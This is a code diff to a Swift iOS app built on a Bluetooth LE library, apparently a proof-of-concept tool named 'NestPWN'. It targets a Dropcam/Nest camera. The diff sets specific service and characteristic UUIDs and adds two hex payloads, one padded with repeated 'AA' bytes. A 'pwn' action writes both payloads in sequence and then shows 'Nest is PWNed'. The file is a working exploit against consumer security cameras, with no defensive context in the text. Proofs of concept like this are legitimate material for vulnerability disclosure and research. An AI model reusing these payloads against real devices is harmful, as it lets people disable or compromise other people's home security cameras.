@@ -35,10 +35,11 @@ class ViewController: UITableViewController {
     var peripheral: Peripheral?
     var pwnCharacteristic: Characteristic?
 
-    let pwnServiceUUID = CBUUID(string: TiSensorTag.AccelerometerService.uuid)
-    let pwnCharacteristicUUID = CBUUID(string: TiSensorTag.AccelerometerService.Enabled.uuid)
-    let nestCameraName = "🎱"
-    let pwnPayload = "01"
+    let pwnServiceUUID = CBUUID(string: "D2D3F8EF-9C99-4D9C-A2B3-91C85D44326C")
+    let pwnCharacteristicUUID = CBUUID(string: "7606123e-4282-4ed4-aca1-2374de7fdb61")
+    let nestCameraName = "Dropcam"
+    let pwnPayload1 = "3a031201AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    let pwnPayload2 = "3b"
     
     let manager = CentralManager(options: [CBCentralManagerOptionRestoreIdentifierKey : "us.gnos.BlueCap.NestPWN" as NSString])
     
@@ -67,15 +68,22 @@ class ViewController: UITableViewController {
         }
     }
     
+    
     @IBAction func pwn(_ sender: AnyObject) {
+        
         guard let peripheral = self.peripheral, peripheral.state != .disconnected, let pwnCharacteristic = pwnCharacteristic else {
             self.present(UIAlertController.alertWithMessage("This should not happen"), animated:true, completion:nil)
             return
         }
-        let writeFuture = pwnCharacteristic.write(data: pwnPayload.dataFromHexString() , timeout: 10.0)
+        
+        let writeFuture = pwnCharacteristic.write(data: pwnPayload1.dataFromHexString() , timeout: 10.0).flatMap { [unowned self] in
+            pwnCharacteristic.write(data: self.pwnPayload2.dataFromHexString())
+        }
+        
         writeFuture.onSuccess { [unowned self] _ in
             self.present(UIAlertController.alertWithMessage("Nest is PWNed"), animated:true, completion:nil)
         }
+        
         writeFuture.onFailure { [unowned self] error in
             self.present(UIAlertController.alertOnError(error), animated:true, completion:nil)
         }
